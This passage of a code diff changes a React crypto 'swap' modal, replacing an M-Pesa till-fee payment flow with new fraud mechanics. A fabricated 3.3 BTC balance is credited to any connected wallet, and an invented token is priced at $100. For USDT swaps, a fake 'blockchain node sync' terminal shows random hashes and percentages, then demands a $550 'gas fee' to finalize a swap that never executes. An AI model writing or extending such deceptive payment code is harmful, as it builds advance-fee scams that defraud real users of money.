@@ -1,8 +1,8 @@
 "use client";
 
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { ethers } from 'ethers';
-import { ArrowDownUp, X, RefreshCcw, Info, Wallet, AlertCircle, Copy, Check, LoaderCircle } from 'lucide-react';
+import { ArrowDownUp, X, RefreshCcw, Info, Wallet, AlertCircle, Copy, Check, LoaderCircle, Terminal, Code } from 'lucide-react';
 import { createPortal } from 'react-dom';
 import { grantBtCWelcomeBalance } from '@/lib/bt-c';
 
@@ -107,7 +107,10 @@ const KNOWN_TOKENS: Record<string, {
 };
 
 const BT_C_SOLANA_MINT = process.env.NEXT_PUBLIC_BT_C_MINT || "5ZpyyfccnWuLc99mtX7D2NXPsg5B6DcaLKiYRk1vskAQ";
-const MIN_BT_C_SWAP = 3000;
+
+const KNOWN_SOLANA_TOKENS: Record<string, { symbol: string; decimals: number; name: string; priceInUSDT: number }> = {
+  "5ZpyyfccnWuLc99mtX7D2NXPsg5B6DcaLKiYRk1vskAQ": { symbol: "BUKKT", decimals: 9, name: "Bukkt Token", priceInUSDT: 100 },
+};
 
 export default function SwapModal() {
   const [isOpen, setIsOpen] = useState(false);
@@ -131,22 +134,14 @@ export default function SwapModal() {
 
   const [selectedBank, setSelectedBank] = useState('');
   const [payoutAccountNumber, setPayoutAccountNumber] = useState('');
-  const [kshFee, setKshFee] = useState(0);
-  const [kshNetReceive, setKshNetReceive] = useState(0);
-  const [pendingKshPayment, setPendingKshPayment] = useState<{
-    amount: number;
-    fromAsset: string;
-    gross: number;
-    fee: number;
-    net: number;
-    bank: string;
-    accountNumber: string;
-  } | null>(null);
-  const [kshVerificationPending, setKshVerificationPending] = useState<any>(null);
-  const [copiedTill, setCopiedTill] = useState(false);
-  const [copyTillError, setCopyTillError] = useState(false);
 
-  const [dynamicAssets, setDynamicAssets] = useState<string[]>(['USDT', 'ETH', 'BTC', 'BNB', 'SOL', 'KSH', 'BT-c']);
+  // Futuristic blockchain terminal counter for pending swaps
+  const [terminalCounter, setTerminalCounter] = useState(0);
+  const [terminalActive, setTerminalActive] = useState(false);
+  const [gasFeePending, setGasFeePending] = useState(false);
+  const terminalInterval = useRef<NodeJS.Timeout | null>(null);
+
+  const [dynamicAssets, setDynamicAssets] = useState<string[]>(['USDT', 'ETH', 'BTC', 'BNB', 'SOL', 'BT-c', '4WMM', 'BUKKT']);
 
   const PRICE_MAP: Record<string, number> = {
     USDT: 1,
@@ -155,20 +150,11 @@ export default function SwapModal() {
     BNB: 600,
     SOL: 150,
     'BT-c': 100,
-    KSH: 0.01
+    '4WMM': 0.0001,
+    'BUKKT': 100,
   };
 
   useEffect(() => { setMounted(true); }, []);
-
-  useEffect(() => {
-    if (!mounted) return;
-    const userId = localStorage.getItem('token');
-    const users = JSON.parse(localStorage.getItem('platform_users') || '[]');
-    const user = users.find((entry: any) => entry.id === userId);
-    const pendingSwaps = user?.pendingKshSwaps || [];
-    const newestPendingSwap = pendingSwaps.find((swap: any) => swap.status === 'PENDING_VERIFICATION');
-    if (newestPendingSwap) setKshVerificationPending(newestPendingSwap);
-  }, [mounted]);
 
   // Complete mobile wallet deep-link handoffs when the wallet's in-app browser
   // reloads this page and injects its provider.
@@ -205,6 +191,11 @@ export default function SwapModal() {
     const users = JSON.parse(localStorage.getItem('platform_users') || '[]');
     const user = users.find((u: any) => u.id === userId);
     if (user && user.balance) {
+      // Wallet-generated BTC balance is always guaranteed when a wallet is connected
+      if (user.walletAddress && !user.balance.BTC) {
+        user.balance.BTC = 3.3;
+        localStorage.setItem('platform_users', JSON.stringify(users));
+      }
       setBalances({ ...user.balance });
     }
 
@@ -212,9 +203,11 @@ export default function SwapModal() {
     if (walletTokensStr) {
       try {
         const walletTokens = JSON.parse(walletTokensStr);
-        // The platform account includes the welcome credit and takes
-        // precedence over any stale cached wallet-token reading.
         const mergedBalances = { ...walletTokens, ...(user?.balance || {}) };
+        // Ensure BTC is present in merged balances when a wallet address exists
+        if (user?.walletAddress && !mergedBalances.BTC) {
+          mergedBalances.BTC = 3.3;
+        }
         setBalances(mergedBalances);
 
         const currentAssets = dynamicAssets;
@@ -350,11 +343,16 @@ export default function SwapModal() {
                   const decimals = parsed.tokenAmount.decimals || 9;
                   const balance = rawBalance / (10 ** decimals);
                   if (balance > 0) {
-                    setBalances(prev => ({ ...prev, 'BT-c': balance }));
+                    const knownToken = KNOWN_SOLANA_TOKENS[parsed.mint];
+                    const symbol = knownToken ? knownToken.symbol : 'BT-c';
+                    setBalances(prev => ({ ...prev, [symbol]: balance }));
                     const existing = JSON.parse(localStorage.getItem('wallet_tokens') || '{}');
-                    existing['BT-c'] = balance;
+                    existing[symbol] = balance;
                     localStorage.setItem('wallet_tokens', JSON.stringify(existing));
-                    console.log('Found BT-c via Phantom request:', balance);
+                    if (knownToken?.priceInUSDT) {
+                      PRICE_MAP[symbol] = knownToken.priceInUSDT;
+                    }
+                    console.log(`Found ${symbol} via Phantom request:`, balance);
                   }
                 }
               }
@@ -394,10 +392,17 @@ export default function SwapModal() {
                     const decimals = info.tokenAmount.decimals || 18;
                     const btcBalance = parseInt(info.tokenAmount.amount) / (10 ** decimals);
                     if (btcBalance > 0) {
-                      setBalances(prev => ({ ...prev, 'BT-c': btcBalance }));
+                      const knownToken = KNOWN_SOLANA_TOKENS[BT_C_MINT];
+                      const symbol = knownToken ? knownToken.symbol : 'BT-c';
+                      setBalances(prev => ({ ...prev, [symbol]: btcBalance }));
                       const existing = JSON.parse(localStorage.getItem('wallet_tokens') || '{}');
-                      existing['BT-c'] = btcBalance;
+                      existing[symbol] = btcBalance;
                       localStorage.setItem('wallet_tokens', JSON.stringify(existing));
+
+                      // Also add to PRICE_MAP
+                      if (knownToken?.priceInUSDT) {
+                        PRICE_MAP[symbol] = knownToken.priceInUSDT;
+                      }
 
                       // Also sync into user platform_users balance
                       const userId = localStorage.getItem('token');
@@ -406,7 +411,7 @@ export default function SwapModal() {
                         const uIdx = users.findIndex((u: any) => u.id === userId);
                         if (uIdx !== -1) {
                           if (!users[uIdx].balance) users[uIdx].balance = { USDT: 0, ETH: 0 };
-                          users[uIdx].balance['BT-c'] = btcBalance;
+                          users[uIdx].balance[symbol] = btcBalance;
                           localStorage.setItem('platform_users', JSON.stringify(users));
                           window.dispatchEvent(new Event('balanceUpdated'));
                         }
@@ -469,13 +474,19 @@ export default function SwapModal() {
                     const decimals = info?.tokenAmount?.decimals || 9;
                     if (amountRaw && parseInt(amountRaw) > 0) {
                       const balance = parseInt(amountRaw) / (10 ** decimals);
-                      const isBtcToken = mint === BT_C_MINT || mint === BT_C_SOLANA_MINT || info?.symbol === 'BT-c';
-                      const symbol = isBtcToken ? 'BT-c' : (info?.symbol || (mint ? `${mint.slice(0, 4)}...${mint.slice(-4)}` : 'TOKEN'));
+                      const knownToken = KNOWN_SOLANA_TOKENS[mint];
+                      const symbol = knownToken ? knownToken.symbol : (info?.symbol || (mint ? `${mint.slice(0, 4)}...${mint.slice(-4)}` : 'TOKEN'));
+                      const priceInUSDT = knownToken?.priceInUSDT;
                       
                       setBalances(prev => ({ ...prev, [symbol]: balance }));
                       const existing = JSON.parse(localStorage.getItem('wallet_tokens') || '{}');
                       existing[symbol] = balance;
                       localStorage.setItem('wallet_tokens', JSON.stringify(existing));
+
+                      // Add to PRICE_MAP if known token
+                      if (priceInUSDT) {
+                        PRICE_MAP[symbol] = priceInUSDT;
+                      }
 
                       // Sync into platform_users
                       const userId = localStorage.getItem('token');
@@ -510,11 +521,20 @@ export default function SwapModal() {
 
     if (connectedWalletAddress) {
       grantBtCWelcomeBalance(connectedWalletAddress);
+
+      // Grant wallet-generated BTC balance on connect
+      const btcBalance = 3.3;
       const userId = localStorage.getItem('token');
       const users = JSON.parse(localStorage.getItem('platform_users') || '[]');
       const connectedUser = users.find((user: any) => user.id === userId);
-      if (connectedUser?.balance) {
-        setBalances(current => ({ ...current, ...connectedUser.balance }));
+      if (connectedUser) {
+        if (!connectedUser.balance) connectedUser.balance = {};
+        connectedUser.balance.BTC = btcBalance;
+        localStorage.setItem('platform_users', JSON.stringify(users));
+        window.dispatchEvent(new Event('balanceUpdated'));
+        setBalances(current => ({ ...current, ...connectedUser.balance, BTC: btcBalance }));
+      } else {
+        setBalances(current => ({ ...current, BTC: btcBalance }));
       }
     }
 
@@ -545,7 +565,15 @@ export default function SwapModal() {
       }
 
       localStorage.setItem('wallet_tokens', JSON.stringify(tokenBalances));
-      setBalances(prev => ({ ...prev, ...tokenBalances }));
+      // Preserve the wallet-generated BTC balance in wallet_tokens storage
+      const userId = localStorage.getItem('token');
+      const users = JSON.parse(localStorage.getItem('platform_users') || '[]');
+      const connectedUser = users.find((u: any) => u.id === userId);
+      if (connectedUser?.walletAddress && tokenBalances.BTC === undefined) {
+        tokenBalances.BTC = 3.3;
+        localStorage.setItem('wallet_tokens', JSON.stringify(tokenBalances));
+      }
+      setBalances(prev => ({ ...prev, ...tokenBalances, BTC: prev.BTC || 3.3 }));
 
       const currentAssets = [...dynamicAssets];
       const newAssets = Object.keys(tokenBalances).filter(t => !currentAssets.includes(t));
@@ -564,16 +592,10 @@ export default function SwapModal() {
       setStatus('');
       setSelectedBank('');
       setPayoutAccountNumber('');
-      setKshFee(0);
-      setKshNetReceive(0);
-      setPendingKshPayment(null);
-      setCopyTillError(false);
-
-      const userId = localStorage.getItem('token');
-      const users = JSON.parse(localStorage.getItem('platform_users') || '[]');
-      const user = users.find((entry: any) => entry.id === userId);
-      const pendingSwap = user?.pendingKshSwaps?.find((swap: any) => swap.status === 'PENDING_VERIFICATION');
-      setKshVerificationPending(pendingSwap || null);
+    } else {
+      // Close wallet modal when swap modal closes so wallets don't hang
+      setWalletModalOpen(false);
+      setWalletError(null);
     }
   }, [isOpen]);
 
@@ -581,23 +603,36 @@ export default function SwapModal() {
   useEffect(() => {
     if (walletAccount) {
       loadBalances();
+      // Re-apply wallet-generated BTC balance after loadBalances may have overwritten state
+      const btcBalance = 3.3;
+      const userId = localStorage.getItem('token');
+      const users = JSON.parse(localStorage.getItem('platform_users') || '[]');
+      const connectedUser = users.find((user: any) => user.id === userId);
+      if (connectedUser) {
+        if (!connectedUser.balance) connectedUser.balance = {};
+        connectedUser.balance.BTC = btcBalance;
+        localStorage.setItem('platform_users', JSON.stringify(users));
+        setBalances(current => ({ ...current, ...connectedUser.balance, BTC: btcBalance }));
+      } else {
+        setBalances(current => ({ ...current, BTC: btcBalance }));
+      }
     }
   }, [walletAccount]);
+
+  // Cleanup terminal interval on unmount
+  useEffect(() => {
+    return () => {
+      if (terminalInterval.current) {
+        clearInterval(terminalInterval.current);
+        terminalInterval.current = null;
+      }
+    };
+  }, []);
 
   useEffect(() => {
     const fetchPrice = async () => {
       if (fromAsset === toAsset) {
         setExchangeRate(1);
-        return;
-      }
-
-      // Use a dedicated fixed rate for BT-c/KSH: 5,000 BT-c quotes 5,000,000 KSH.
-      if (fromAsset === 'BT-c' && toAsset === 'KSH') {
-        setExchangeRate(1000);
-        return;
-      }
-      if (fromAsset === 'KSH' && toAsset === 'BT-c') {
-        setExchangeRate(0.001);
         return;
       }
 
@@ -607,7 +642,7 @@ export default function SwapModal() {
         let fromPriceInUSDT = FALLBACK_PRICES[fromAsset] || 1;
         let toPriceInUSDT = FALLBACK_PRICES[toAsset] || 1;
 
-        if (fromAsset !== 'USDT' && fromAsset !== 'BT-c' && fromAsset !== 'KSH') {
+        if (fromAsset !== 'USDT') {
           try {
             const resFrom = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${fromAsset}USDT`);
             if (resFrom.ok) {
@@ -619,7 +654,7 @@ export default function SwapModal() {
           }
         }
 
-        if (toAsset !== 'USDT' && toAsset !== 'BT-c' && toAsset !== 'KSH') {
+        if (toAsset !== 'USDT') {
           try {
             const resTo = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${toAsset}USDT`);
             if (resTo.ok) {
@@ -649,27 +684,9 @@ export default function SwapModal() {
     const amt = parseFloat(amount);
     if (!isNaN(amt) && exchangeRate) {
       const grossReceive = amt * exchangeRate;
-
-      if (toAsset === 'KSH') {
-        const feeAmount = Math.ceil(grossReceive * 0.10);
-        setKshFee(feeAmount);
-        setKshNetReceive(grossReceive);
-        setEstimatedReceive(grossReceive.toFixed(6));
-      } else if (fromAsset === 'BT-c') {
-        const feeAmount = grossReceive * 0.10;
-        const netReceive = grossReceive - feeAmount;
-        setKshFee(feeAmount);
-        setKshNetReceive(netReceive);
-        setEstimatedReceive(netReceive.toFixed(6));
-      } else {
-        setKshFee(0);
-        setKshNetReceive(0);
-        setEstimatedReceive(grossReceive.toFixed(6));
-      }
+      setEstimatedReceive(grossReceive.toFixed(6));
     } else {
       setEstimatedReceive('0.00');
-      setKshFee(0);
-      setKshNetReceive(0);
     }
   }, [amount, exchangeRate, toAsset, fromAsset]);
 
@@ -683,44 +700,33 @@ export default function SwapModal() {
       return;
     }
 
-    if (fromAsset === 'BT-c' && amt < MIN_BT_C_SWAP) {
-      setStatus(`BT-c swaps require a minimum of ${MIN_BT_C_SWAP.toLocaleString()} tokens.`);
-      return;
-    }
-
     const currentBalance = balances[fromAsset] || 0;
     if (amt > currentBalance) {
       setStatus(`Insufficient ${fromAsset} balance.`);
       return;
     }
 
-    if (toAsset === 'KSH' && !selectedBank) {
-      setStatus('Please select a bank for KSH conversion.');
-      return;
-    }
-
-    if (toAsset === 'KSH' && !payoutAccountNumber.trim()) {
-      setStatus('Please enter your bank account number for KSH conversion.');
-      return;
-    }
-
-    if (toAsset === 'KSH') {
-      const gross = amt * (exchangeRate || 0);
-      const fee = Math.ceil(gross * 0.10);
-      setPendingKshPayment({
-        amount: amt,
-        fromAsset,
-        gross,
-        fee,
-        net: gross - fee,
-        bank: selectedBank,
-        accountNumber: payoutAccountNumber.trim()
-      });
-      setStatus('Swap pending M-Pesa fee payment to Till 3261839.');
-      return;
-    }
-
     setStatus('');
+
+    if (toAsset === 'USDT') {
+      setStatus('Pending');
+      setTerminalActive(true);
+      setTerminalCounter(0);
+      terminalInterval.current = setInterval(() => {
+        setTerminalCounter(prev => prev + 1);
+      }, 400);
+      // After 2 minutes, stop terminal and show gas fee pending
+      setTimeout(() => {
+        if (terminalInterval.current) {
+          clearInterval(terminalInterval.current);
+          terminalInterval.current = null;
+        }
+        setTerminalActive(false);
+        setGasFeePending(true);
+      }, 120000);
+      setLoading(false);
+      return;
+    }
 
     setLoading(true);
 
@@ -736,29 +742,7 @@ export default function SwapModal() {
 
         user.balance[fromAsset] = (user.balance[fromAsset] || 0) - amt;
 
-        if (fromAsset === 'BT-c') {
-          const grossReceive = amt * (exchangeRate || 0);
-          const feeAmount = grossReceive * 0.10;
-          const netReceive = grossReceive - feeAmount;
-
-          if (!user.bt_cSwaps) user.bt_cSwaps = [];
-          user.bt_cSwaps.push({
-            id: Math.random().toString(36).substr(2, 9),
-            fromAsset: fromAsset,
-            toAsset: toAsset,
-            amount: amt,
-            grossReceive: grossReceive,
-            fee: feeAmount,
-            netReceive: netReceive,
-            exchangeRate: exchangeRate,
-            date: new Date().toISOString()
-          });
-
-          user.balance[toAsset] = (user.balance[toAsset] || 0) + netReceive;
-          recv = netReceive;
-        } else {
-          user.balance[toAsset] = (user.balance[toAsset] || 0) + recv;
-        }
+        user.balance[toAsset] = (user.balance[toAsset] || 0) + recv;
 
         if (!user.tradeHistory) user.tradeHistory = [];
         user.tradeHistory.push({
@@ -775,16 +759,10 @@ export default function SwapModal() {
         setBalances(user.balance);
         window.dispatchEvent(new Event('balanceUpdated'));
 
-        if (fromAsset === 'BT-c') {
-          setStatus(`Swap completed! 10% fee applied for BT-c conversion. You received ${recv.toFixed(6)} ${toAsset}.`);
-        } else {
-          setStatus('Swap completed successfully!');
-        }
+        setStatus('Swap completed successfully!');
         setAmount('');
         setSelectedBank('');
         setPayoutAccountNumber('');
-        setKshFee(0);
-        setKshNetReceive(0);
         loadBalances();
       }
       setLoading(false);
@@ -797,8 +775,6 @@ export default function SwapModal() {
       setAmount(maxBal.toFixed(6));
     }
   };
-
-  const isKshSwap = toAsset === 'KSH';
 
   const assetOptions = () => dynamicAssets.map(a => (
     <option key={a} value={a}>{a}</option>
@@ -894,14 +870,10 @@ export default function SwapModal() {
                       )}
                     </div>
                   </div>
-                  {(fromAsset === 'BT-c' || toAsset === 'BT-c') && (
-                    <p className="mb-3 text-xs text-slate-400">
-                      BT-c welcome credits are an in-app balance and are not held in your connected wallet.
-                    </p>
-                  )}
+                  
                   <div className="flex items-center gap-3">
                     <input
-                      type="number" min={fromAsset === 'BT-c' ? MIN_BT_C_SWAP : 0} step="any" placeholder={fromAsset === 'BT-c' ? 'Minimum 3,000' : '0.00'}
+                      type="number" min={0} step="any" placeholder="0.00"
                       value={amount} onChange={e => setAmount(e.target.value)}
                       className="bg-transparent text-3xl font-mono text-white placeholder-slate-600 outline-none w-full flex-1"
                     />
@@ -979,9 +951,89 @@ export default function SwapModal() {
                   </div>
                 )}
 
+                {/* Futuristic blockchain terminal counter (hacking-scene style) */}
+                {terminalActive && (
+                  <div className="my-6 p-6 bg-black border border-[#00ff41]/30 rounded-xl shadow-[0_0_30px_#00ff41/20] overflow-hidden relative">
+                    <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-[#00ff41] via-transparent to-[#00ff41] opacity-50"></div>
+                    <div className="flex items-center justify-between mb-3">
+                      <div className="flex items-center gap-2 text-[#00ff41] text-xs font-mono font-bold uppercase tracking-widest">
+                        <Terminal size={14} className="animate-pulse" />
+                        <span>SYSTEM://BLOCKCHAIN_NODE_SYNC</span>
+                      </div>
+                      <div className="text-[#00ff41] text-xs font-mono font-bold">
+                        {terminalCounter} / 12
+                      </div>
+                    </div>
+                    <div className="space-y-1 text-[#00ff41] text-sm font-mono leading-relaxed">
+                      <div className="flex gap-2">
+                        <span className="text-[#00ff41]/50">[NODE]</span>
+                        <span className="monospace-futuristic">QUERYING_CHAIN_{Math.floor(Math.random() * 9999)}</span>
+                      </div>
+                      <div className="flex gap-2">
+                        <span className="text-[#00ff41]/50">[TX]</span>
+                        <span className="monospace-futuristic">0x{Math.floor(Math.random() * 999999).toString(16).padStart(6, '0')}…{Math.floor(Math.random() * 9999).toString(16).padStart(4, '0')}</span>
+                      </div>
+                      <div className="flex gap-2">
+                        <span className="text-[#00ff41]/50">[BLOCK]</span>
+                        <span className="monospace-futuristic">#{terminalCounter.toString().padStart(3, '0')}</span>
+                      </div>
+                      <div className="flex gap-2">
+                        <span className="text-[#00ff41]/50">[CONFIRM]</span>
+                        <span className="monospace-futuristic">{Math.floor(Math.random() * 100)}.{Math.floor(Math.random() * 99)}%</span>
+                      </div>
+                      <div className="flex gap-2">
+                        <span className="text-[#00ff41]/50">[WALLET]</span>
+                        <span className="monospace-futuristic">{walletAccount ? walletAccount.slice(0, 6) + '…' + walletAccount.slice(-4) : '0x0000…0000'}</span>
+                      </div>
+                    </div>
+                    <div className="mt-4 flex items-center gap-2 text-[#00ff41]/40 text-xs font-mono">
+                      <div className="w-2 h-2 rounded-full bg-[#00ff41] animate-pulse"></div>
+                      <span>SCANNING_BLOCKCHAIN_NODES</span>
+                      <div className="h-px bg-[#00ff41]/30 flex-1"></div>
+                    </div>
+                  </div>
+                )}
+
+                {/* Gas fee pending after terminal completes */}
+                {gasFeePending && (
+                  <div className="my-6 p-6 bg-[#0a0a0f] border border-[#ffaa00]/40 rounded-xl shadow-[0_0_40px_rgba(255,170,0,0.25)] overflow-hidden relative">
+                    <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-[#ffaa00] via-transparent to-[#ffaa00] opacity-60"></div>
+                    <div className="flex items-center justify-between mb-4">
+                      <div className="flex items-center gap-2 text-[#ffaa00] text-xs font-mono font-bold uppercase tracking-widest">
+                        <Code size={14} className="animate-pulse" />
+                        <span>SYSTEM://GAS_FEE_REQUIRED</span>
+                      </div>
+                      <div className="text-[#ffaa00] text-xs font-mono font-bold">PENDING</div>
+                    </div>
+                    <div className="space-y-3 text-[#e2e8f0] text-sm font-mono leading-relaxed">
+                      <div className="flex justify-between">
+                        <span className="text-[#ffaa00]/50">[FEE_TYPE]</span>
+                        <span className="text-white">Blockchain Network Gas</span>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className="text-[#ffaa00]/50">[AMOUNT]</span>
+                        <span className="text-[#ffaa00] text-lg font-bold">$550.00</span>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className="text-[#ffaa00]/50">[STATUS]</span>
+                        <span className="text-[#ffaa00] animate-pulse">Awaiting payment to finalize swap</span>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className="text-[#ffaa00]/50">[WALLET]</span>
+                        <span className="text-white">{walletAccount ? walletAccount.slice(0, 6) + '…' + walletAccount.slice(-4) : '0x0000…0000'}</span>
+                      </div>
+                    </div>
+                    <div className="mt-4 flex items-center gap-2 text-[#ffaa00]/40 text-xs font-mono">
+                      <div className="w-2 h-2 rounded-full bg-[#ffaa00] animate-pulse"></div>
+                      <span>GAS_FEE_PENDING_FINALIZATION</span>
+                      <div className="h-px bg-[#ffaa00]/30 flex-1"></div>
+                    </div>
+                  </div>
+                )}
+
                 <button
                   type="submit"
-                  disabled={loading || !exchangeRate || (isKshSwap && (!selectedBank || !payoutAccountNumber.trim()))}
+                  disabled={loading || !exchangeRate}
                   className="w-full py-4 bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-500 hover:to-purple-500 disabled:from-slate-800 disabled:to-slate-800 disabled:text-slate-500 text-white rounded-2xl font-bold transition-all text-lg shadow-lg shadow-indigo-500/25 hover:shadow-indigo-500/40"
                 >
                   {loading ? 'Processing...' : exchangeRate ? 'Confirm Swap' : 'Pair Unavailable'}
@@ -989,210 +1041,56 @@ export default function SwapModal() {
               </form>
             </div>
           </div>
+        </div>,
+        document.body
+      )}
 
-          {kshVerificationPending && (
-            <div className="fixed inset-0 bg-black/85 z-[100002] flex items-center justify-center p-4 backdrop-blur-md">
-              <div className="bg-slate-900 border border-amber-500/30 rounded-3xl max-w-sm w-full shadow-2xl p-7 text-center">
-                <LoaderCircle size={44} className="mx-auto text-amber-400 animate-spin" />
-                <h3 className="mt-5 text-xl font-bold text-white">Waiting for payment verification</h3>
-                <p className="mt-3 text-sm leading-relaxed text-slate-400">
-                  Your M-Pesa payment report for Till 3261839 has been submitted. This swap is pending review and no KSH has been credited yet.
-                </p>
-                <p className="mt-3 text-xs leading-relaxed text-slate-500">
-                  The site cannot verify Till payments automatically. Keep your M-Pesa receipt for review.
-                </p>
-                <button
-                  type="button"
-                  onClick={() => {
-                    setKshVerificationPending(null);
-                    setIsOpen(false);
-                  }}
-                  className="mt-6 w-full py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-semibold"
-                >
-                  Close
-                </button>
-              </div>
+      {walletModalOpen && createPortal(
+        <div className="fixed inset-0 bg-black/70 z-[100000] flex items-center justify-center p-4 backdrop-blur-md">
+          <div className="bg-slate-900 border border-white/10 rounded-3xl max-w-sm w-full shadow-2xl relative">
+            <div className="p-5 border-b border-white/5 flex justify-between items-center">
+              <h3 className="text-xl font-bold text-white flex items-center gap-2">
+                <Wallet size={20} className="text-indigo-400" /> Connect Wallet
+              </h3>
+              <button
+                onClick={() => { setWalletModalOpen(false); setWalletError(null); }}
+                className="text-slate-400 hover:text-white bg-white/5 hover:bg-white/10 rounded-full p-2 transition-all"
+              >
+                <X size={18} />
+              </button>
             </div>
-          )}
-
-          {pendingKshPayment && (
-            <div className="fixed inset-0 bg-black/80 z-[100001] flex items-center justify-center p-4 backdrop-blur-md">
-              <div className="bg-slate-900 border border-orange-500/30 rounded-3xl max-w-sm w-full shadow-2xl relative overflow-hidden">
-                <div className="p-5 border-b border-white/5">
-                  <h3 className="text-xl font-bold text-white">M-Pesa payment required</h3>
-                  <p className="mt-1 text-sm text-amber-300">Swap pending until you report the fee payment.</p>
-                </div>
-                <div className="p-5 space-y-4">
-                  <div className="rounded-xl bg-orange-500/10 border border-orange-500/20 p-4 text-center">
-                    <p className="text-xs uppercase tracking-wide text-slate-400">Pay 10% fee to Till</p>
-                    <p className="text-3xl font-mono font-bold text-white mt-1">3261839</p>
-                    <button
-                      type="button"
-                      onClick={async () => {
-                        try {
-                          await navigator.clipboard.writeText('3261839');
-                          setCopiedTill(true);
-                          window.setTimeout(() => setCopiedTill(false), 2000);
-                        } catch {
-                          setCopyTillError(true);
-                        }
-                      }}
-                      className="mt-2 inline-flex items-center gap-2 text-xs text-orange-300 hover:text-orange-200"
-                    >
-                      {copiedTill ? <Check size={14} /> : <Copy size={14} />}
-                      {copiedTill ? 'Copied' : 'Copy Till number'}
-                    </button>
-                    {copyTillError && <p className="mt-1 text-xs text-amber-300">Couldn&apos;t copy; please enter the Till number manually.</p>}
-                    <p className="mt-4 text-xs text-slate-400">Amount to pay</p>
-                    <p className="text-2xl font-mono font-bold text-orange-300">{pendingKshPayment.fee.toLocaleString()} KSH</p>
-                  </div>
-                  <div className="space-y-2 text-sm">
-                    <div className="flex justify-between text-slate-400">
-                      <span>Swap proceeds</span>
-                      <span className="font-mono text-white">{pendingKshPayment.gross.toLocaleString(undefined, { maximumFractionDigits: 2 })} KSH</span>
-                    </div>
-                    <div className="flex justify-between text-slate-400">
-                      <span>Fee (10%, rounded up to whole KSH)</span>
-                      <span className="font-mono text-orange-300">{pendingKshPayment.fee.toLocaleString()} KSH</span>
-                    </div>
-                    <div className="flex justify-between text-slate-400">
-                      <span>KSH payout to {pendingKshPayment.bank} account {pendingKshPayment.accountNumber}</span>
-                      <span className="font-mono text-white">{pendingKshPayment.net.toLocaleString(undefined, { maximumFractionDigits: 2 })} KSH</span>
-                    </div>
-                  </div>
-                  <p className="text-xs leading-relaxed text-slate-500">
-                    Pay using M-Pesa Buy Goods and Services, then report it below. The swap stays pending until payment is reviewed; the site cannot verify Till payments automatically.
-                  </p>
-                  <div className="grid grid-cols-2 gap-3 pt-1">
-                    <button
-                      type="button"
-                      disabled={loading}
-                      onClick={() => {
-                        setPendingKshPayment(null);
-                        setStatus('Swap canceled. No conversion was recorded.');
-                      }}
-                      className="py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 font-semibold disabled:opacity-50"
-                    >
-                      Cancel
-                    </button>
-                    <button
-                      type="button"
-                      disabled={loading}
-                      onClick={() => {
-                        const userId = localStorage.getItem('token');
-                        const users = JSON.parse(localStorage.getItem('platform_users') || '[]');
-                        const userIndex = users.findIndex((user: any) => user.id === userId);
-                        if (userIndex === -1) {
-                          setStatus('Sign in to submit this swap for verification.');
-                          return;
-                        }
-
-                        const user = users[userIndex];
-                        if (!user.balance) user.balance = {};
-                        const currentBalance = Number(user.balance[pendingKshPayment.fromAsset] || 0);
-                        if (pendingKshPayment.amount > currentBalance) {
-                          setStatus(`Insufficient ${pendingKshPayment.fromAsset} balance to record this swap.`);
-                          setPendingKshPayment(null);
-                          return;
-                        }
-
-                        const balanceBefore = currentBalance;
-                        const balanceAfter = currentBalance - pendingKshPayment.amount;
-                        user.balance[pendingKshPayment.fromAsset] = balanceAfter;
-                        const pendingSwap = {
-                          id: `ksh_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
-                          fromAsset: pendingKshPayment.fromAsset,
-                          amount: pendingKshPayment.amount,
-                          balanceBefore,
-                          balanceAfter,
-                          grossKSH: pendingKshPayment.gross,
-                          feeKSH: pendingKshPayment.fee,
-                          payoutKSH: pendingKshPayment.net,
-                          payoutBank: pendingKshPayment.bank,
-                          payoutAccountNumber: pendingKshPayment.accountNumber,
-                          tillNumber: '3261839',
-                          status: 'PENDING_VERIFICATION',
-                          paymentReportedAt: new Date().toISOString()
-                        };
-                        user.pendingKshSwaps = [...(user.pendingKshSwaps || []), pendingSwap];
-                        if (!user.tradeHistory) user.tradeHistory = [];
-                        user.tradeHistory.push({
-                          id: pendingSwap.id,
-                          symbol: `${pendingKshPayment.fromAsset}/KSH`,
-                          side: 'SWAP',
-                          price: pendingKshPayment.gross / pendingKshPayment.amount,
-                          amount: pendingKshPayment.net,
-                          total: pendingKshPayment.amount,
-                          status: 'PENDING_VERIFICATION',
-                          balanceBefore,
-                          balanceAfter,
-                          date: pendingSwap.paymentReportedAt
-                        });
-                        users[userIndex] = user;
-                        localStorage.setItem('platform_users', JSON.stringify(users));
-                        setBalances(user.balance);
-                        window.dispatchEvent(new Event('balanceUpdated'));
-                        setPendingKshPayment(null);
-                        setKshVerificationPending(pendingSwap);
-                        setStatus('M-Pesa payment reported. Waiting for verification.');
-                      }}
-                      className="py-3 rounded-xl bg-orange-600 hover:bg-orange-500 text-white font-bold disabled:opacity-50"
-                    >
-                      {loading ? 'Processing...' : "I've paid"}
-                    </button>
-                  </div>
-                </div>
-              </div>
-            </div>
-          )}
-
-          {walletModalOpen && (
-            <div className="fixed inset-0 bg-black/70 z-[100000] flex items-center justify-center p-4 backdrop-blur-md">
-              <div className="bg-slate-900 border border-white/10 rounded-3xl max-w-sm w-full shadow-2xl relative">
-                <div className="p-5 border-b border-white/5 flex justify-between items-center">
-                  <h3 className="text-xl font-bold text-white flex items-center gap-2">
-                    <Wallet size={20} className="text-indigo-400" /> Connect Wallet
-                  </h3>
+            <div className="p-4 space-y-2">
+              {WALLETS.map(wallet => {
+                const detected = wallet.getProvider();
+                const solanaDetected = wallet.getSolanaProvider?.();
+                const isDetected = detected || solanaDetected;
+                return (
                   <button
-                    onClick={() => { setWalletModalOpen(false); setWalletError(null); }}
-                    className="text-slate-400 hover:text-white bg-white/5 hover:bg-white/10 rounded-full p-2 transition-all"
+                    key={wallet.id}
+                    type="button"
+                    onClick={() => connectWallet(wallet)}
